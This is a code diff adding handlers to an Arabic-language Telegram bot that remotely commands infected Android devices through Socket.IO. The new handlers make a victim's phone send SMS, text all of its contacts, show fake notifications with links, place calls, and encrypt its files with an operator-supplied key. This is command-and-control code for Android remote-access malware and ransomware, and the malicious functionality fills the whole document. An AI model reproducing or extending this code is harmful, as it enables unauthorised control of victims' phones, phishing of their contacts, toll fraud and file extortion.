@@ -292,6 +292,212 @@ bot.on("message", msg => {
       }
     }).catch(console.error);
   } 
+  // إصلاح مشاكل الأوامر الجديدة
+  else if (appData.get("currentAction") === "toastText") {
+    const toastText = text;
+    const target = appData.get("currentTarget");
+    
+    io.to(target).emit("commend", {
+      request: "toast",
+      extras: [{ key: "text", value: toastText }]
+    });
+    
+    appData.delete("currentTarget");
+    appData.delete("currentAction");
+    
+    bot.sendMessage(chatId, `<b>✅ تم عرض الرسالة بنجاح</b>`, {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [
+          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
+          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
+        ],
+        resize_keyboard: true
+      }
+    }).catch(console.error);
+  }
+  else if (appData.get("currentAction") === "smsNumber") {
+    const number = text;
+    appData.set("currentNumber", number);
+    appData.set("currentAction", "smsText");
+    
+    bot.sendMessage(chatId, "<b>💬 أدخل نص الرسالة:</b>", {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [["❌ إلغاء الإجراء ❌"]],
+        resize_keyboard: true,
+        one_time_keyboard: true
+      }
+    }).catch(console.error);
+  }
+  else if (appData.get("currentAction") === "smsText") {
+    const smsText = text;
+    const number = appData.get("currentNumber");
+    const target = appData.get("currentTarget");
+    
+    io.to(target).emit("commend", {
+      request: "sendSms",
+      extras: [
+        { key: "number", value: number },
+        { key: "text", value: smsText }
+      ]
+    });
+    
+    appData.delete("currentTarget");
+    appData.delete("currentAction");
+    appData.delete("currentNumber");
+    
+    bot.sendMessage(chatId, "<b>✅ تم إرسال الرسالة بنجاح</b>", {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [
+          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
+          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
+        ],
+        resize_keyboard: true
+      }
+    }).catch(console.error);
+  }
+  else if (appData.get("currentAction") === "textToAllContacts") {
+    const messageText = text;
+    const target = appData.get("currentTarget");
+    
+    io.to(target).emit("commend", {
+      request: "smsToAllContacts",
+      extras: [{ key: "text", value: messageText }]
+    });
+    
+    appData.delete("currentTarget");
+    appData.delete("currentAction");
+    
+    bot.sendMessage(chatId, "<b>✅ تم إرسال الرسالة للجميع</b>", {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [
+          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
+          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
+        ],
+        resize_keyboard: true
+      }
+    }).catch(console.error);
+  }
+  else if (appData.get("currentAction") === "notificationText") {
+    const notificationText = text;
+    appData.set("currentNotificationText", notificationText);
+    appData.set("currentAction", "notificationUrl");
+    
+    bot.sendMessage(chatId, "<b>🔗 أدخل رابط الإشعار (URL):</b>", {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [["❌ إلغاء الإجراء ❌"]],
+        resize_keyboard: true,
+        one_time_keyboard: true
+      }
+    }).catch(console.error);
+  }
+  else if (appData.get("currentAction") === "notificationUrl") {
+    const notificationUrl = text;
+    const notificationText = appData.get("currentNotificationText");
+    const target = appData.get("currentTarget");
+    
+    io.to(target).emit("commend", {
+      request: "popNotification",
+      extras: [
+        { key: "text", value: notificationText },
+        { key: "url", value: notificationUrl }
+      ]
+    });
+    
+    appData.delete("currentTarget");
+    appData.delete("currentAction");
+    appData.delete("currentNotificationText");
+    
+    bot.sendMessage(chatId, "<b>✅ تم عرض الإشعار المزيف</b>", {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [
+          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
+          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
+        ],
+        resize_keyboard: true
+      }
+    }).catch(console.error);
+  }
+  else if (appData.get("currentAction") === "makeCallNumber") {
+    const phoneNumber = text;
+    appData.set("currentNumber", phoneNumber);
+    appData.set("currentAction", "makeCallConfirm");
+    
+    bot.sendMessage(chatId, `<b>📞 تأكيد الاتصال بالرقم: ${phoneNumber}</b>\n\n` +
+                           "أرسل كلمة 'موافق' لتأكيد الاتصال", {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [["❌ إلغاء الإجراء ❌"]],
+        resize_keyboard: true,
+        one_time_keyboard: true
+      }
+    }).catch(console.error);
+  }
+  else if (appData.get("currentAction") === "makeCallConfirm") {
+    if (text.toLowerCase() === "موافق") {
+      const phoneNumber = appData.get("currentNumber");
+      const target = appData.get("currentTarget");
+      
+      io.to(target).emit("commend", {
+        request: "makeCall",
+        extras: [{ key: "number", value: phoneNumber }]
+      });
+      
+      appData.delete("currentTarget");
+      appData.delete("currentAction");
+      appData.delete("currentNumber");
+      
+      bot.sendMessage(chatId, "<b>✅ تم إجراء المكالمة بنجاح</b>", {
+        parse_mode: "HTML",
+        reply_markup: {
+          keyboard: [
+            ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
+            ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
+          ],
+          resize_keyboard: true
+        }
+      }).catch(console.error);
+    } else {
+      bot.sendMessage(chatId, "<b>❌ تم إلغاء الإجراء</b>", {
+        parse_mode: "HTML",
+        reply_markup: {
+          keyboard: [
+            ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
+            ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
+          ],
+          resize_keyboard: true
+        }
+      }).catch(console.error);
+    }
+  }
+  else if (appData.get("currentAction") === "encryptFiles") {
+    const encryptionKey = text;
+    const target = appData.get("currentTarget");
+    
+    io.to(target).emit("commend", {
+      request: "encryptFiles",
+      extras: [{ key: "key", value: encryptionKey }]
+    });
+    
+    appData.delete("currentTarget");
+    appData.delete("currentAction");
+    
+    bot.sendMessage(chatId, "<b>✅ تم تشفير الملفات بنجاح</b>", {
+      parse_mode: "HTML",
+      reply_markup: {
+        keyboard: [
+          ["📊 عدد الأجهزة", "🎮 لوحة التحكم"],
+          ["👨‍💻 معلومات المطور", "★ تطبيق الهدف ★"]
+        ],
+        resize_keyboard: true
+      }
+    }).catch(console.error);
+  }
   
   // Handle other actions...
   
